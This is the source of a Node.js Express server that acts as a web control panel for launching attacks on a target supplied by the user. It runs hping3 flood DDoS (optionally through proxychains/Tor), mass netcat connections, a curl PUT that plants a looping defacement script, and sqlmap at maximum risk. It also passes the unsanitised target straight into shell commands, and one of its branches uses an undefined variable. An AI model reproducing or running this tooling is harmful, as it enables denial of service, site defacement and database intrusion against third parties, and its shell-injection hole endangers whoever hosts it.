const express = require('express');
const app = express();
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');
const publicIp = require('public-ip');

app.use(express.static('public'));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const logFilePath = path.join(__dirname, 'logs.txt');

const log = (message) => {
    const timestamp = new Date().toISOString();
    const logMessage = `[${timestamp}] ${message}\n`;
    fs.appendFile(logFilePath, logMessage, (err) => {
        if (err) console.error('Failed to write to log:', err);
    });
    console.log(logMessage.trim());
};

app.post('/attack', async (req, res) => {
    const target = req.body.target;
    const attackType = req.body.attackType;
    const duration = parseInt(req.body.duration) || 60;
    const intensity = parseInt(req.body.intensity) || 100; // New intensity parameter

    if (!target) {
        log('Error: Target URL is required.');
        return res.status(400).send('Target URL is required.');
    }

    let command = '';

    switch (attackType) {
        case 'ddos':
            // Improved DDoS: Multi-pronged attack using multiple tools
            const numThreads = os.cpus().length * 2; // Use multiple threads based on CPU cores
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do hping3 -c ${intensity * 100} -d 120 -S -u -p 80 --flood ${target} & done"`;
            break;
        case 'deface':
            // Deface: Inject a script to continuously replace the content
            const defaceScript = `<script>
                setInterval(function() {
                    document.body.innerHTML = '<h1>Hacked by Noodles!</h1><img src="https://i.imgur.com/xxxxx.gif" style="width: 100%; height: auto;">'; // Replace with shock image
                    document.title = 'Noodles Hacked You!';
                }, 100);
            </script>`;
            command = `curl -X PUT -d '${defaceScript}' ${target}/index.html`;
            break;
        case 'connect':
            // Connect: Attempt to establish multiple connections
            command = `timeout ${duration} bash -c "for i in $(seq 500); do nc -v ${target} 80 & done"`;
            break;
        case 'tor_ddos':
             try {
                const externalIp = await publicIp.v4();
                log(`Attacker IP: ${externalIp}`);

                // Tor DDoS: Route hping3 traffic through Tor
                command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do proxychains4 hping3 -c ${intensity * 100} -d 120 -S -u -p 80 --flood ${target} & done"`;
            } catch (error) {
                log(`Error getting public IP: ${error.message}`);
                return res.status(500).send(`Error getting public IP: ${error.message}`);
            }
            break;
        case 'sql_inject':
            command = `sqlmap --url "${target}" --dbs --batch --level 5 --risk 3`;
            break;

        default:
            log(`Error: Invalid attack type: ${attackType}`);
            return res.status(400).send('Invalid attack type.');
    }

    log(`Initiating ${attackType} attack on ${target} for ${duration} seconds with intensity ${intensity}.`);

    exec(command, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
            log(`Attack failed: ${error.message}`);
            console.error(`exec error: ${error}`);
            return res.status(500).send(`Attack failed: ${error.message}`);
        }
        if (stderr) {
             log(`Attack stderr: ${stderr}`);
        }
        log(`Attack completed. stdout: ${stdout}`);
        res.send('Attack initiated. Check logs for details.');
    });
});

app.get('/logs', (req, res) => {
    fs.readFile(logFilePath, 'utf8', (err, data) => {
        if (err) {
            console.error('Failed to read logs:', err);
            return res.status(500).send('Failed to read logs.');
        }
        res.send(data.split('\n').reverse().join('\n'));
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server listening on port ${PORT}`);
    log(`Server started on port ${PORT}`);
});

